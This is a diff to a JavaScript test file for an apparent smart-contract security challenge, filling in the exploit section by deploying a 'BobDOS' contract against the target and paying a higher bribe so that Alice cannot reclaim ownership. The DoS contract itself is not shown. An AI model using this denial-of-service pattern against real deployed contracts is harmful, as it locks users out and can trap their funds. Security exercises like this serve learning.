@@ -11,6 +11,7 @@ describe(challengeName, function () {
   let alice, bob;
 
   const INITIAL_BRIBE = ethers.utils.parseEther("1");
+  const NEXT_BRIBE = ethers.utils.parseEther("2");
 
   before(async function () {
     /** SETUP SCENARIO - DON'T CHANGE ANYTHING HERE */
@@ -25,12 +26,13 @@ describe(challengeName, function () {
   });
 
   it("Exploit", async function () {
-    /** CODE YOUR EXPLOIT HERE  */
+    const DOSContract = await ethers.getContractFactory("BobDOS");
+    const doscontract = await DOSContract.deploy(this.calyptusHill.address);
+    doscontract.connect(bob).getOnTop({ value: NEXT_BRIBE });
   });
 
   after(async function () {
     /** SUCCESS CONDITIONS */
-
     // Alice tries to reclaim the ownership...
     var bribe = await this.calyptusHill.bribe();
 
